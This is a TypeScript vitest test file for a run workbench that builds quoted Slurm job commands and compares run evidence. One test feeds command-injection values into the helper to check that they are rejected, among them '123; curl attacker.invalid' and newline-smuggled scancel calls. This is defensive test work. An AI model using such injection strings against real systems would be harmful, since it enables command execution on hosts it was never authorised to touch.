import { describe, expect, it } from "vitest";
import { nativeRunCommands, runComparisonRows } from "./RunEvidencePanel";
import type { EvidenceObject, RunSummary } from "./types";

describe("Run workbench helpers", () => {
  it("generates bounded native commands without executing them", () => {
    const commands = nativeRunCommands("123_4", "/public/home/alice/project one");

    expect(commands.map((item) => item.label)).toEqual([
      "Queue",
      "Detail",
      "Accounting",
      "Output tail",
      "Cancel",
    ]);
    expect(commands.at(-1)).toMatchObject({ dangerous: true });
    expect(commands[0]?.command).toContain("'123_4'");
    expect(commands.find((item) => item.label === "Output tail")?.command).toContain(
      "'/public/home/alice/project one/slurm-123_4.out'",
    );
  });

  it("refuses job identifiers containing shell syntax or control characters", () => {
    expect(nativeRunCommands("123; curl attacker.invalid")).toEqual([]);
    expect(nativeRunCommands("123\nscancel 1")).toEqual([]);
    expect(nativeRunCommands("123", "/tmp/a\nscancel 1").map((item) => item.label)).not.toContain("Output tail");
  });

  it("compares server facts and finalized Evidence counts", () => {
    const current = run("run_current", "SUCCEEDED", "0:0");
    const source = run("run_source", "FAILED", "1:0");
    const rows = runComparisonRows(
      current,
      [evidence("e1", true), evidence("e2", false)],
      source,
      [evidence("e3", true)],
    );

    expect(rows.find((row) => row.label === "State")).toMatchObject({
      current: "SUCCEEDED",
      other: "FAILED",
      changed: true,
    });
    expect(rows.find((row) => row.label === "Finalized evidence")).toMatchObject({
      current: "1",
      other: "1",
      changed: false,
    });
  });
});

function run(runId: string, state: RunSummary["state"], exitCode: string): RunSummary {
  return {
    run_id: runId,
    contract_id: "contract_1",
    owner: "alice",
    state,
    collection_state: "succeeded",
    diagnosis_state: "succeeded",
    capsule_state: "ready",
    result_status: state === "SUCCEEDED" ? "success" : "failed",
    job_id: "123",
    exit_code: exitCode,
    created_at: "2026-07-16T00:00:00+00:00",
    updated_at: "2026-07-16T00:01:00+00:00",
  };
}

function evidence(objectId: string, finalized: boolean): EvidenceObject {
  return {
    object_id: objectId,
    category: "logs",
    logical_path: `logs/${objectId}`,
    source_uri: null,
    sha256: "a".repeat(64),
    size_bytes: 10,
    mime_type: "text/plain",
    collection_status: "collected",
    mutable_during_run: false,
    finalized_at: finalized ? "2026-07-16T00:01:00+00:00" : null,
  };
}
